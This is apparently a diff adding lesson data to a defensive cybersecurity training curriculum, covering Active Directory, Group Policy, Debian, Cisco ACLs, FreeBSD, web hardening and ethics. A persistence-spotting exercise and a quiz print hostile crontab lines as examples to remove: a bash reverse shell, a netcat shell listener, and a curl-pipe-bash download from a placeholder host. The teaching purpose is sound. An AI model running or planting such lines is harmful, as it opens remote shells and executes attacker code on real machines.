+     TERM('14:07  WIN   Disabled Guest (Disable-LocalUser -Name Guest)   undo: Enable-LocalUser -Name Guest\n14:09  WIN   Removed dave from Administrators                   undo: Add-LocalGroupMember -Group Administrators -Member dave\n14:15  MINT  ufw enable, default deny incoming                  undo: sudo ufw disable\n14:22  MINT  purged vsftpd                                      undo: sudo apt install vsftpd\n14:24  MINT  AVAILABILITY CHECK FAILED -> reinstalled vsftpd; brief says customers use FTP. Harden instead.'),
+     TIPS('Log before the Enter key, not after. The habit is the point.','One scribe per machine; the driver says the change out loud.','Keep the undo column honest. "Reinstall" is not an undo if you also deleted the config.')),
+   QUIZ('s6q','Check: investigation and logging',[
+     ['Question: "What is the MD5 hash of /home/bob/notes.txt?" You answer with sha256sum output. Is that correct?',['Yes, hashes are hashes','No: the question asked for MD5','Only if the file is small','Yes, if you also include the path'],1,'Use the algorithm asked: md5sum /home/bob/notes.txt'],
+     ['Which Windows Security event ID means a user account was created?',['4624','4625','4720','4732'],2,'4720 created, 4726 deleted, 4732 added to a local group, 4624 logon, 4625 failed logon.'],
+     ['The fastest way to find which change broke a required service is',['Re-read the brief','Your change log, newest entry first','Reboot the machine','Reinstall the operating system'],1,'Newest change first, then undo it and confirm the service is back.'],
+     ['Decode: ZmxhZw== (base64)',['flag','frog','file','fail'],0,'echo "ZmxhZw==" | base64 -d prints flag. Investigations often meet base64 in scripts, logs and config files.']
+   ]),
+   LINKS('Go further',['ms-sysint','explainshell','pico','t4t-range'])
+  ]}
+ ]
+});
+/* ---------------------------- JUNIOR ---------------------------- */
+LEVELS.push({
+ id:'junior', grade:'Junior', range:'Intermediate to advanced', color:'var(--l3)', chev:3,
+ blooms:['A','An','E'], bloomCap:'Apply, analyze and evaluate. You judge trade-offs and defend your choices.',
+ intro:'Servers and networks. Windows Server with Active Directory and Group Policy, Debian, and Cisco networks with VLANs, inter-VLAN routing and access control lists. You stop following checklists and start reasoning about why one fix beats another.',
+ mentor:['Shift from "what" to "why". After each fix ask: which hardening area, which principle, what would break if you did the opposite?','Server topics take the longest. Give Active Directory and Group Policy their own sessions.','Have the learner who owns networking teach VLANs and ACLs back to the group. Teaching is the Analyze level in disguise.','Introduce the Config Audit drill here; evaluating someone else’s config is exactly this grade’s Bloom band.'],
+ units:[
+ {id:'j1',title:'Windows Server and Active Directory',bloom:'Apply',sum:'Domain controllers, users and groups in AD, and the few server roles you will actually touch.',
+  blocks:[
+   C('Server is not just a bigger desktop','Understand',
+     TIPS('A <b>domain controller</b> (DC) holds Active Directory: the central database of users, groups and computers. On a DC you manage <b>domain</b> accounts, not local ones.',
+          '<b>Active Directory Users and Computers</b> (<code>dsa.msc</code>) is where domain users and groups live. A DC has no local accounts database of its own to manage.',
+          'Key groups: <b>Domain Admins</b> and <b>Enterprise Admins</b> (full control), <b>Administrators</b>. Strip anyone the scenario brief does not authorize.',
+          'Servers often run real services: DNS, DHCP, IIS (web), file shares. Harden what the brief keeps; remove roles it does not mention.'),
+     CMDS('AD from PowerShell',[
+       ['Get-ADUser -Filter * -Properties Enabled | Select-Object Name,Enabled','Domain users. (Get-LocalUser is for member servers and desktops.)'],
+       ['Get-ADGroupMember "Domain Admins"','Who holds the keys to the domain. Compare to the brief.'],
+       ['Remove-ADGroupMember -Identity "Domain Admins" -Members dave','Strip an unauthorized domain admin.'],
+       ['Disable-ADAccount -Identity guest','Disable an account you are told is unauthorized but must not delete.'],
+       ['Set-ADUser -Identity bob -ChangePasswordAtLogon $true','Force a reset for a compromised account.'],
+       ['Get-ADDefaultDomainPasswordPolicy','Domain password policy (set in the Default Domain Policy GPO, not secpol).']
+     ])),
+   C('Server roles and features','Apply',
+     CMDS('See and shrink the attack surface',[
+       ['Get-WindowsFeature | Where-Object Installed','Every installed role and feature. Remove ones the brief does not justify.'],
+       ['Uninstall-WindowsFeature -Name Web-Ftp-Service','Example: remove the FTP role if not required.'],
+       ['Get-Service | Where-Object {$_.Status -eq "Running"} | Select-Object Name,DisplayName','Running services, same idea as the desktop.'],
+       ['Get-SmbShare | Select-Object Name,Path,Description','File shares. Remove-SmbShare for ones not in the scenario.'],
+       ['Get-DnsServerResourceRecord -ZoneName example.com','If it is a DNS server: look for records that do not belong.']
+     ])),
+   QUIZ('j1q','Check: server and AD',[
+     ['On a domain controller, where do you remove a user’s administrative power?',['Local Users and Groups','Active Directory Users and Computers / the right AD group','secpol.msc','Task Manager'],1,'Domain accounts live in AD. Local tools barely apply on a DC.'],
+     ['The brief lists Domain Admins as: administrator, alice. You find administrator, alice, eve. Action?',['Delete eve','Remove eve from Domain Admins (delete only if eve is also an unauthorized account)','Leave it','Add everyone to be safe'],1,'Strip the group membership first. Deleting an account the scenario expects elsewhere would break availability for that person.'],
+     ['The domain password policy is set in',['secpol.msc on each machine','the Default Domain Policy GPO','each user’s properties','the registry only'],1,'Group Policy at the domain level governs domain accounts. Local policy does not.'],
+     ['A server runs the Web-Ftp-Service role, not mentioned in the brief. Best action?',['Keep it','Uninstall the role and confirm the web site (if required) still works','Only firewall it','Rename it'],1,'Remove unneeded roles to shrink the attack surface, then verify required services survive.']
+   ]),
+   LINKS('Go further',['ms-winsrv','ms-win-sec','cis','stig','t4t-ld-winsrv','t4t-lr-win'])
+  ]},
+ {id:'j2',title:'Group Policy',bloom:'Apply',sum:'How GPOs enforce settings across a domain, the high-value ones, and how to confirm they applied.',
+  blocks:[
+   C('One place to set a thousand machines','Understand',
+     TIPS('A <b>Group Policy Object</b> (GPO) is a bundle of settings linked to the domain or an organizational unit. Settings flow down to the computers and users underneath.',
+          'The <b>Default Domain Policy</b> carries password and lockout policy for the whole domain. Edit it in <b>Group Policy Management</b> (<code>gpmc.msc</code>).',
+          'Computer settings apply at boot and refresh periodically; user settings at logon. Force a refresh with <code>gpupdate /force</code>.',
+          'High-value areas: Account Policies, User Rights Assignment, Security Options, Audit Policy, and Administrative Templates for Windows components.'),
+     CMDS('Work with and verify GPOs',[
+       ['gpmc.msc','Group Policy Management: create, link, and edit GPOs.'],
+       ['gpupdate /force','Reapply policy now instead of waiting.'],
+       ['gpresult /r','What policy is actually applied to this machine and user.'],
+       ['Get-ADDefaultDomainPasswordPolicy','Confirm domain password settings after editing the Default Domain Policy.'],
+       ['auditpol /get /category:*','Current audit policy. Enable logon and account-management auditing where the brief or good practice calls for it.']
+     ])),
+   ORDER('j2o','Order: enforce a domain password policy','Put the steps in order.',[
+     ['Open Group Policy Management (gpmc.msc)','You edit domain policy here, not in local secpol.'],
+     ['Edit the Default Domain Policy','This GPO owns password and lockout policy for all domain accounts.'],
+     ['Set Account Policies: minimum length, complexity, history, max age','The settings themselves, following your organization’s policy.'],
+     ['Set Account Lockout Policy: threshold, duration, reset counter','Slows brute force across the domain.'],
+     ['Run gpupdate /force on the DC','Apply immediately instead of waiting for the refresh cycle.'],
+     ['Verify with Get-ADDefaultDomainPasswordPolicy','Prove the change took effect before moving on.']
+   ]),
+   QUIZ('j2q','Check: Group Policy',[
+     ['A setting in the Default Domain Policy is not showing up on a workstation. First command?',['shutdown /r','gpupdate /force then gpresult /r','net accounts','ipconfig /flushdns'],1,'Force the refresh, then confirm what applied. gpresult /r shows which GPOs won.'],
+     ['Which policy area would you use to stop a normal user from logging on locally to the DC?',['Password Policy','User Rights Assignment','Windows Update','Firewall'],1,'User Rights Assignment controls "Allow/Deny log on locally" and similar rights.'],
+     ['Domain password policy belongs in',['each local machine’s secpol','the Default Domain Policy GPO','the hosts file','Task Scheduler'],1,'One GPO at the domain level governs every domain account.'],
+     ['gpresult /r is for',['forcing a policy refresh','showing which policies are applied here','creating a GPO','editing the registry'],1,'It reports applied policy. gpupdate applies; gpresult reports.']
+   ]),
+   LINKS('Go further',['ms-winsrv','ms-baselines','stig','t4t-ld-winsrv'])
+  ]},
+ {id:'j3',title:'Debian and deeper Linux',bloom:'Analyze',sum:'What differs from Mint and Ubuntu, plus auditing, logging, cron, kernel parameters and finding persistence.',
+  blocks:[
+   C('Debian differences and deeper hardening','Analyze',
+     TIPS('Debian (12 "bookworm", 13 "trixie") is close to Ubuntu but leaner. New installs do not include rsyslog; logs live in the systemd journal, so use <code>journalctl</code> rather than /var/log/auth.log. Some setups use a custom admin group; confirm with <code>sudo -l</code> and <code>/etc/sudoers</code>.',
+          'No firewall front end by default: ufw may not be installed. Check with <code>which ufw</code>; nftables is the native packet filter.',
+          'Services you may meet: Apache or nginx, MySQL/MariaDB, Samba, Postfix, vsftpd, Bind9. Harden the ones the brief keeps.',
+          'Think in the six areas, not in commands: accounts, access, configuration, patching, malware and persistence, logging.'),
+     CMDS('Audit and investigate',[
+       ['sudo journalctl -p err -b','Errors since boot. Add --since "1 hour ago" to narrow.'],
+       ['sudo journalctl -u ssh --since today','Logs for one service.'],
+       ['systemctl list-unit-files --state=enabled','What starts at boot. Disable what the brief does not need.'],
+       ['crontab -l; sudo crontab -l','User and root cron jobs. Also check /etc/cron.* and /etc/crontab for rogue entries.'],
+       ['ls -la /etc/cron.d /etc/cron.daily /etc/cron.hourly','Cron drop-in directories: a classic persistence spot.'],
+       ['sudo grep -R "" /etc/systemd/system/*.service 2>/dev/null | grep -i exec','Look at ExecStart lines for odd commands in custom units.'],
+       ['sudo ss -tulnp','Listening sockets with process. Match to the services you expect.'],
+       ['sudo lsof -i -nP 2>/dev/null','Every network connection by process, confirming what ss shows.'],
+       ['sudo find / -newermt "2026-01-01" -type f 2>/dev/null | grep -vE "^/proc|^/sys"','Files changed after a date: scoping recent tampering.']
+     ])),
+   C('Kernel and logging baseline','Apply',
+     CMDS('sysctl, auditd and the journal',[
+       ['sudo sysctl -w net.ipv4.conf.all.rp_filter=1','Reverse-path filtering (anti-spoofing). Persist in a file under /etc/sysctl.d/.'],
+       ['sudo sysctl -w net.ipv4.icmp_echo_ignore_broadcasts=1','Ignore broadcast pings (smurf protection).'],
+       ['sudo sysctl -w kernel.randomize_va_space=2','Full ASLR, a memory-corruption mitigation.'],
+       ['sudo apt install auditd && sudo systemctl enable --now auditd','Kernel audit logging of security events.'],
+       ['journalctl --list-boots','More than one boot listed means the journal survives reboots. If not, set Storage=persistent in /etc/systemd/journald.conf and restart systemd-journald.']
+     ])),
+   SPOT('j3sp','Spot the persistence: crontab -l','Tap every line that looks like a backdoor or does not belong, then Check.',[
+     ['# m h  dom mon dow   command',null],
+     ['0 3 * * * /usr/bin/apt-get update',null],
+     ['*/5 * * * * /bin/bash -c \'bash -i >& /dev/tcp/203.0.113.9/4444 0>&1\'','A reverse shell every five minutes. Remove it and hunt for whatever installed it.'],
+     ['0 2 * * 0 /usr/local/bin/backup.sh',null],
+     ['@reboot nc -lvp 1337 -e /bin/bash','A netcat backdoor that re-opens on every reboot. Remove.'],
+     ['30 1 * * * certbot renew --quiet',null],
+     ['* * * * * curl -s http://malware.example/x.sh | bash','Downloads and runs a script every minute (malware.example is a reserved example name). Remove immediately.']
+   ]),
+   QUIZ('j3q','Check: deeper Linux',[
+     ['On a fresh Debian install, /var/log/auth.log is missing. Where do you read authentication events?',['It cannot be done','journalctl, the systemd journal','/etc/passwd','dmesg only'],1,'Since Debian 12, rsyslog is not installed by default, so Debian logs to the journal. For SSH logins use journalctl -u ssh. (Filtering on the process name sshd misses them on Debian 13: since OpenSSH 9.8 they come from sshd-session.)'],
+     ['A cron line runs bash -i >& /dev/tcp/.../4444. This is',['A backup','A reverse shell backdoor','A system update','A log rotation'],1,'That is an attacker call-home. Remove the line and investigate how it got there (check all cron dirs, systemd units, .bashrc).'],
+     ['Which sysctl helps against IP address spoofing?',['kernel.randomize_va_space','net.ipv4.conf.all.rp_filter','vm.swappiness','fs.file-max'],1,'rp_filter drops packets whose source could not have arrived on that interface.'],
+     ['Best single command to see what is listening and which process owns it?',['ps aux','sudo ss -tulnp','top','df -h'],1,'ss -tulnp ties ports to processes, the question you ask on every machine.']
+   ]),
+   LINKS('Go further',['debian-handbook','debian-security','debian-wiki','cis','stig','explainshell','t4t-lr-linux'])
+  ]},
+ {id:'j4',title:'Cisco: VLANs, routing and ACLs',bloom:'Apply',sum:'Segment a network with VLANs, route between them, and filter traffic with access lists.',
+  blocks:[
+   C('VLANs and trunks','Apply',
+     CMDS('Segment the switch',[
+       ['vlan 10','Create a VLAN. Then: name SALES'],
+       ['interface range fastethernet0/1 - 8','Several ports at once.'],
+       ['switchport mode access','These are host ports, not trunks.'],
+       ['switchport access vlan 10','Put the ports in VLAN 10.'],
+       ['interface gigabitethernet0/1','The link to the router or another switch.'],
+       ['switchport mode trunk','Carry multiple VLANs over one link.'],
+       ['switchport trunk allowed vlan 10,20','Only the VLANs you intend. Fewer VLANs on a trunk means less exposure.'],
+       ['show vlan brief','Verify port-to-VLAN assignments.'],
+       ['show interfaces trunk','Verify the trunk and allowed VLANs.']
+     ])),
+   C('Inter-VLAN routing and ACLs','Apply',
+     CMDS('Route, then filter',[
+       ['interface gigabitethernet0/0/0.10','Router subinterface for VLAN 10 (router-on-a-stick).'],
+       ['encapsulation dot1q 10','Tag this subinterface for VLAN 10.'],
+       ['ip address 192.168.10.1 255.255.255.0','Gateway for VLAN 10 hosts.'],
+       ['access-list 10 permit 192.168.10.0 0.0.0.255','Standard ACL: match a source network with a wildcard mask (inverse of the subnet mask).'],
+       ['ip access-list extended BLOCK_TELNET','Named extended ACL for protocol/port control.'],
+       ['deny tcp any any eq 23','Inside the named ACL: block Telnet everywhere.'],
+       ['permit ip any any','End with a permit when you only mean to block some traffic, or the implicit deny drops everything.'],
+       ['interface gigabitethernet0/0/0.10','Apply the ACL: then ip access-group BLOCK_TELNET in'],
+       ['show access-lists','Verify ACLs and hit counts.'],
+       ['show ip route','Verify routing, including connected VLAN subnets.']
+     ]),
+     NOTE('Every ACL ends with an invisible <code>deny any</code>. If you only write deny statements, you block all traffic. Order matters: the first match wins.')),
+   QUIZ('j4q','Check: switching and routing',[
+     ['The wildcard mask for the subnet 255.255.255.0 in an ACL is',['255.255.255.0','0.0.0.255','255.255.255.255','0.0.0.0'],1,'Wildcard masks are the inverse of the subnet mask. 0 means "must match", 255 means "any".'],
+     ['Hosts in VLAN 10 and VLAN 20 cannot reach each other. What provides the path?',['A second switch','Inter-VLAN routing (router subinterfaces or a layer 3 switch)','A longer cable','Disabling the firewall'],1,'VLANs are separate networks; something at layer 3 must route between them.'],
+     ['Your extended ACL has only "deny tcp any any eq 23". Hosts lose all connectivity. Why?',['Telnet is required','The implicit deny any at the end drops everything else','ACLs do not work on routers','The switch is off'],1,'Add permit ip any any after the deny so other traffic passes.'],
+     ['Which command shows which ports belong to which VLAN?',['show ip route','show vlan brief','show running-config | include ip','show mac address-table'],1,'show vlan brief maps VLANs to access ports. show interfaces trunk shows the trunks.']
+   ]),
+   LINKS('Go further',['t4t-ios','t4t-audit','t4t-tickets','t4t-lr-ios','netacad','pt'])
+  ]},
+ {id:'j5',title:'Evaluate a configuration',bloom:'Evaluate',sum:'Read a config or a system like an auditor: rank findings by impact and defend the order.',
+  blocks:[
+   C('Thinking like an auditor','Evaluate',
+     P('At this grade you stop asking "is this a finding?" and start asking "which finding do I fix first?" Rank by <b>impact</b> (how much an attacker gains) and <b>effort</b> (how fast you fix it). A domain admin backdoor outranks a missing login banner even though both are findings.'),
+     TIPS('High impact: extra administrators, UID-0 backdoors, reverse shells, root SSH login, blank or shared passwords, disabled firewall and antivirus.',
+          'Medium: missing updates, weak password policy, insecure services the brief does not need, over-broad shares.',
+          'Low but worth doing: banners, screen-lock timeouts, audit logging, SMBv1, unauthorized media files.',
+          'Always weigh availability risk: a "fix" that stops a required service is an outage, which is worse than leaving the finding for later.')),
+   ORDER('j5o','Rank the findings on one machine','Order these from fix-first to fix-last by impact, assuming none is a required service.',[
+     ['A second account with UID 0','An unauthorized root. Total compromise; fix immediately.'],
+     ['A reverse-shell cron job calling out to the internet','Active backdoor; remove now and find its source.'],
+     ['Guest account enabled with blank password','Trivial anonymous access; disable at once.'],
+     ['SSH permits root login with a password','Direct remote path to the crown jewels; close it.'],
+     ['No automatic updates and 40 missing patches','Serious but slower to exploit than an open door; patch next.'],
+     ['Missing login banner and 15-minute screen lock','Low impact, still worth fixing; mop up at the end.']
+   ]),
+   QUIZ('j5q','Check: judgment',[
+     ['Two findings: (a) Telnet running, required by the brief for a legacy device; (b) a netcat listener on 1337 not in the brief. Which do you remove?',['Both','Only (b); harden and restrict (a)','Only (a)','Neither'],1,'Required services get hardened and restricted, not removed. The unlisted listener is malware.'],
+     ['Your maintenance window closes in ten minutes. Which usually reduces the most risk per minute?',['Writing a login banner','Confirming no unauthorized admins remain and the firewall and antivirus are on','Renaming the Administrator account','Reading the whole config again'],1,'High-impact areas first. Cheap, high-value checks beat cosmetic ones under time pressure.'],
+     ['A teammate wants to delete a user to "be safe," but the brief lists that user as authorized. Your call?',['Delete it','Keep it; deleting an authorized user breaks something the business needs','Disable it, then delete it','Rename it'],1,'Authorized means protected. Disabling it is also wrong here; leave it and secure it.'],
+     ['Why rank findings at all instead of fixing them top to bottom?',['It looks professional','Time is limited and impact varies; ranking removes the most risk soonest','The firewall requires it','It does not matter'],1,'Triage is the skill. Highest impact, lowest effort, lowest availability risk, first.']
+   ]),
+   LINKS('Go further',['t4t-audit','stig','cis','nist-csf'])
+  ]}
+ ]
+});
+/* ---------------------------- SENIOR ---------------------------- */
+LEVELS.push({
+ id:'senior', grade:'Senior', range:'Advanced to team lead', color:'var(--l4)', chev:4,
+ blooms:['An','E','Cr'], bloomCap:'Analyze, evaluate and create. You build systems: a checklist, a role plan, a runbook.',
+ intro:'FreeBSD and web application security join the mix, and the differentiator stops being knowledge. It becomes a team that works like a system: a checklist written from standards, clear roles, a time plan, and the discipline to understand every change before making it. This grade is where you create those artifacts, and own the ethics that come with the skill.',
+ mentor:['Hand the pen to the learners. Your job here is to review what they create (checklist, role plan, runbook), not to dictate it.','Run full timed practice sessions on Lockdown Range or your own VMs, then debrief. The debrief, not the run, is where the learning lands.','Train every fix by hand before anyone automates it. A script nobody on the team can explain is a liability.','Make the ethics conversation explicit and recurring. These learners can now do real damage; the whole point is that they choose not to.'],
+ units:[
+ {id:'se1',title:'FreeBSD',bloom:'Analyze',sum:'A different Unix: where the files live, how services and the firewall work, and how to map your Linux habits across.',
+  blocks:[
+   C('Translate your Linux instincts','Analyze',
+     TIPS('FreeBSD is Unix but not Linux. The base system and third-party <b>ports/packages</b> are separate. Package tool: <code>pkg</code>.',
+          'Services are enabled in <b>/etc/rc.conf</b> (or with <code>sysrc</code>) and started or stopped with <code>service</code>. There is no systemd.',
+          'FreeBSD has three firewalls built into the base system: <b>pf</b>, <b>ipfw</b> and <b>ipf</b> (IPFILTER). pf rules live in <code>/etc/pf.conf</code>.',
+          'Users: <code>pw</code> manages accounts; membership in the <b>wheel</b> group is required to <code>su</code> to root; sudo, if installed from packages, is configured in <code>/usr/local/etc/sudoers</code>.',
+          'Updating: <code>freebsd-update fetch install</code> for the base system, <code>pkg update &amp;&amp; pkg upgrade</code> for packages. On a system installed from base packages (pkgbase, FreeBSD 15 and later), <code>pkg upgrade -r FreeBSD-base</code> patches the base instead.'),
+     CMDS('FreeBSD essentials',[
+       ['cat /etc/passwd','Same format idea as Linux. Hunt for UID 0 accounts: besides root, some FreeBSD releases ship toor, a spare superuser whose login is disabled (* in master.passwd). Anything else at UID 0 is a finding.'],
+       ['pw groupshow wheel','Who can su to root. Compare to the scenario brief.'],
+       ['pw groupmod wheel -d dave','Remove dave from wheel.'],
+       ['pw lock bob','Lock an account (pw unlock bob reverses it).'],
+       ['sysrc -a','Show rc.conf settings (what is enabled at boot).'],
+       ['service -e','List enabled services.'],
+       ['service sshd restart','Start/stop/restart a service by name.'],
+       ['sockstat -4 -l','Listening IPv4 sockets with the owning process (FreeBSD’s answer to ss).'],
+       ['pkg info','Installed packages. pkg which /path traces a file to its package.'],
+       ['freebsd-update fetch install','Patch the base system. On a pkgbase install: pkg upgrade -r FreeBSD-base.'],
+       ['vi /etc/pf.conf','Firewall rules. Then: pfctl -f /etc/pf.conf to load, pfctl -e to enable.']
+     ])),
+   C('A minimal pf firewall','Apply',
+     TERM('# /etc/pf.conf  (default deny inbound, allow outbound, permit SSH)\next_if = "em0"\nset skip on lo\nblock in all\npass out all keep state\npass in on $ext_if proto tcp to ($ext_if) port 22 keep state'),
+     TIPS('Load and enable: <code>pfctl -f /etc/pf.conf</code> then <code>pfctl -e</code>. Check rules with <code>pfctl -sr</code>.',
+          'Enable at boot: <code>sysrc pf_enable=YES</code> and <code>sysrc pf_rules=/etc/pf.conf</code>.',
+          'Open only the ports the brief needs. The idea is identical to ufw; the syntax is new.')),
+   QUIZ('se1q','Check: FreeBSD',[
+     ['Which group lets a user su to root on FreeBSD?',['sudo','wheel','admin','root'],1,'wheel. Membership in wheel is required to su, and sudo (if present) is configured separately.'],
+     ['How do you enable a service at boot on FreeBSD?',['systemctl enable','edit /etc/rc.conf (or sysrc name_enable=YES)','update-rc.d','chkconfig on'],1,'rc.conf plus the service command. No systemd here.'],
+     ['The default rules file for pf is',['/etc/ufw/rules','/etc/pf.conf','/etc/iptables.rules','/etc/firewalld'],1,'/etc/pf.conf, loaded with pfctl -f and enabled with pfctl -e.'],
+     ['Listening sockets with their process on FreeBSD:',['ss -tulnp','sockstat -4 -l','netstat only','lsof is the only option'],1,'sockstat -4 -l is the FreeBSD habit; ss is Linux-only.']
+   ]),
+   LINKS('Go further',['fbsd','cis','stig','t4t-ld-fbsd'])
+  ]},
+ {id:'se2',title:'Web application security',bloom:'Analyze',sum:'The OWASP Top 10, the risks behind it, and how to harden a small web stack.',
+  blocks:[
+   C('What to know','Understand',
+     P('Most organizations run at least one small web application: an intranet, a shop, a ticket system. Securing it rewards understanding the common web risks and the configuration of the server behind them, not writing exploits.'),
+     TIPS('Learn the <b>OWASP Top 10 (2025)</b> by name and idea: broken access control (number one), security misconfiguration, software supply chain failures, cryptographic failures, injection (SQL, command), insecure design, authentication failures, software or data integrity failures, security logging and alerting failures, and mishandling of exceptional conditions.',
+          'Server side, the familiar areas return: patch the web server (Apache/nginx) and language runtime, remove default pages and sample apps, disable directory listing, set correct file permissions, and run the service as a low-privileged user.',
+          'Credentials: no default admin passwords, no secrets in world-readable config files, database accounts limited to what the app needs.',
+          'Practice safely on a deliberately vulnerable app you run locally, never on a site you do not own.'),
+     CMDS('Harden a small web stack (Apache on Debian/Ubuntu)',[
+       ['sudo apt update && sudo apt upgrade','Patch the server and the web/app packages first.'],
+       ['sudo find /var/www -type f -perm -o+w 2>/dev/null','World-writable web files: tighten them.'],
+       ['sudo chown -R root:www-data /var/www/html && sudo chmod -R g-w,o-w /var/www/html','Content owned by root, readable by the web server group, writable by neither the service nor other users. Give the service write access only to the folders the app must write to.'],
+       ['sudo nano /etc/apache2/apache2.conf','In the &lt;Directory /var/www/&gt; block change "Options Indexes FollowSymLinks" to "Options FollowSymLinks" to turn off directory listing.'],
+       ['sudo nano /etc/apache2/conf-available/security.conf','Set ServerTokens Prod and ServerSignature Off, then sudo apachectl configtest && sudo systemctl reload apache2.'],
+       ['grep -ri "password" /var/www 2>/dev/null','Hunt for credentials left in source or config.'],
+       ['sudo ss -tulnp | grep -E ":80|:443|:3306"','Confirm only the expected web and database ports listen, and bind the database to localhost if only the app uses it.']
+     ])),
+   QUIZ('se2q','Check: web hardening',[
+     ['A small company web app has an admin panel anyone can reach without logging in. This is',['SQL injection','Broken access control','A firewall issue','Expected behavior'],1,'Reaching things you should not is broken access control, number one in the OWASP Top 10 (2025).'],
+     ['Where should you practice web attacks and fixes?',['A random live website','A deliberately vulnerable app you run locally (for example OWASP Juice Shop)','Your school portal','A classmate’s site'],1,'Only systems you own or are authorized to test. Juice Shop is built for exactly this.'],
+     ['A database account used by the web app has full admin rights to every database. Better posture?',['Leave it, it works','Grant only the privileges, on only the database, the app needs','Delete the database','Share the admin password with the team'],1,'Least privilege applies to database accounts too. Limit scope and privileges to the app’s actual needs.'],
+     ['Directory listing shows every file under /files to any visitor. Fix on Apache?',['Add Indexes to Options','Remove Indexes from Options for that directory and set correct permissions','Rename the folder','Nothing, it is fine'],1,'Turn off directory listing and make sure only intended files are served.']
+   ]),
+   LINKS('Go further',['owasp10','juice','cis','stig'])
+  ]},
+ {id:'se3',title:'Create: your own checklist',bloom:'Create',sum:'Build a per-OS hardening checklist from standards and vendor documentation: the single biggest speed multiplier.',
+  blocks:[
+   C('Why you build it yourself','Create',
+     P('A checklist your team writes from <b>general documentation</b> (CIS Benchmarks, vendor docs, DISA STIGs) is how the knowledge becomes yours. A copied list gives you steps without reasons, and when something breaks you will not know which step did it. This is the Create level of Bloom’s taxonomy: you are producing an original artifact from everything below.'),
+     NOTE('Cite a source for every line (a CIS recommendation number, a Microsoft Learn page, a man page), so you can re-check it when versions change. Check each source’s license and terms of use before you share anything copied from it.')),
+   BUILDER('se3b','Checklist builder','Fill each section for one operating system. Export the text, then refine it after every practice session. Nothing you type here leaves this browser.',[
+     ['os','Operating system this checklist is for','e.g. Windows 11, Windows Server 2025, Linux Mint, Ubuntu, Debian, FreeBSD'],
+     ['first','First five minutes (orientation)','Read the scenario brief and investigation questions; note users, admins, required services; record a baseline; snapshot if allowed; assign roles; start the change log.'],
+     ['accounts','Account management and access control','List authorized users and admins; remove or disable the rest; strip extra admins; disable guest; no blank passwords; force resets on compromised accounts.'],
+     ['policy','Password and lockout policy','Minimum length, history, age, complexity per your policy; lockout threshold, duration, reset window. Where to set it on this OS, and which standard you follow.'],
+     ['firewall','Firewall','Default deny inbound, allow outbound, open only required ports. The exact tool and commands for this OS.'],
+     ['services','Services, startup and persistence','Enumerate listening ports and running services; remove or disable insecure ones not in the brief; check scheduled tasks / cron / rc.conf for persistence.'],
+     ['updates','Patching and malware defenses','Patch the OS; enable automatic updates; confirm antivirus on and current (where applicable).'],
+     ['files','Files, shares and unauthorized software','Fix shares and dangerous permissions; find unauthorized media; uninstall unauthorized or remote-access software.'],
+     ['forensics','Investigation approach','How you will find and answer: search, hash, read logs; answer in the exact format; touch nothing else.'],
+     ['verify','Verify and sweep','Re-run your baseline commands and compare; confirm every required service and user still works; mop up low-impact items (banners, screen lock, logging).']
+   ]),
+   LINKS('Go further',['cis','cis-controls','stig','ms-baselines','ubuntu-sec','fbsd'])
+  ]},
+ {id:'se4',title:'Create: roles, timing and the runbook',bloom:'Create',sum:'Turn a small team and a fixed time window into a system: who does what, when, and how you hand off.',
+  blocks:[
+   C('A team is a design, not a crowd','Create',
+     TIPS('<b>Assign machines to people.</b> Typically one or two people per machine and one who owns the network devices. Depth matters: everyone should be able to cover a second machine.',
+          '<b>One scribe per machine</b> keeps the change log; the driver says each change out loud before pressing Enter.',
+          '<b>A timekeeper</b> calls the clock: halfway, a quarter left, and fifteen minutes left (stop making changes; verify every required service and user still works).',
+          '<b>Plan the session.</b> Rough split: the first fifteen to twenty minutes on the brief, the baseline and accounts; the bulk on the high-value areas; the last stretch on verification, investigation questions and low-impact items.',
+          '<b>Debrief every run.</b> What did we miss, what broke, what goes on the checklist. The debrief is the real practice.',
+          'The same structure runs real maintenance windows and incident response: a lead, a scribe, a clock and a written plan (NIST CSF 2.0 calls that last part Respond).')),
+   PLANNER('se4pl'),
+   TIMER('se4tm'),
+   REFLECT('se4r','Write your team’s one-page runbook','In your own words: the order of operations for the first twenty minutes, who owns each machine and the network devices, who keeps the log, and the three checks the timekeeper calls out. Keep it to one page. Print it. Rehearse it.'),
+   LINKS('Go further',['nist-csf','cis-controls','t4t-range'])
+  ]},
+ {id:'se5',title:'Power and responsibility',bloom:'Evaluate',sum:'You can now break and defend real systems. The whole point of the training is choosing how to use it.',
+  blocks:[
+   C('The line you do not cross','Evaluate',
+     P('Everything in this ladder gives you real capability. The same skills that harden a practice lab can disable a real system; the same investigation that answers a lab question can expose a real person. Labs are systems built to be changed. Outside them, <b>authorization is the entire difference between a security professional and a criminal</b>, and the law does not grade on intent alone.'),
+     TIPS('<b>Just because you can does not mean you should.</b> Capability is not permission.',
+          'Get explicit, written authorization before touching any system you do not own. "I was only curious" is not a defense.',
+          'Handle other people’s data as if it were your own: minimize, protect, never spread. Investigation answers go in the report, nowhere else.',
+          'Report weaknesses to the owner; do not exploit them or publicize them.',
+          'Follow the stricter of two rules. If your school or employer bans something a course or club allows, the stricter rule wins.',
+          '<b>Academic integrity is the same muscle.</b> Do your own work on graded labs and quizzes, cite your sources, and ask when the rules are unclear.',
+          'The reputation you build now follows you into every clearance, job and team. Guard it.')),
+   QUIZ('se5q','Check: judgment under temptation',[
+     ['You notice your school’s grade portal has an obvious access-control flaw. The right move is',['Fix it yourself','Report it to the IT staff and do not access anything','Show your friends','Use it once, just to confirm'],1,'Report, do not touch. Accessing a system you are not authorized to administer is unauthorized access regardless of motive.'],
+     ['A recruiter asks you to "test" a company’s site before an interview to prove your skills. No contract, no scope. You',['Do it to impress them','Decline without written authorization and scope','Do a little and stop','Ask a friend to do it'],1,'No authorization, no test. A professional insists on written permission and defined scope first.'],
+     ['An investigation question in a lab reveals a real-looking Social Security number. You',['Post it as a funny find','Answer only what the question asks and keep the data in the answer','Save it for later','Message it to a teammate'],1,'Treat even scenario data as real PII. Minimize and contain; never spread it.'],
+     ['Your team wrote a script that automates twenty hardening fixes. Before running it on a machine you are authorized to harden, you',['Run it right away; it worked last time','Read and understand every line, test it on a snapshot or copy first, and confirm every change is within your authorization and the brief','Download a bigger script from a forum and run that instead','Run it on every machine on the school network to save time'],1,'A script is many changes at once. Understand each line, test where mistakes are cheap, stay within scope, and log what it changed.'],
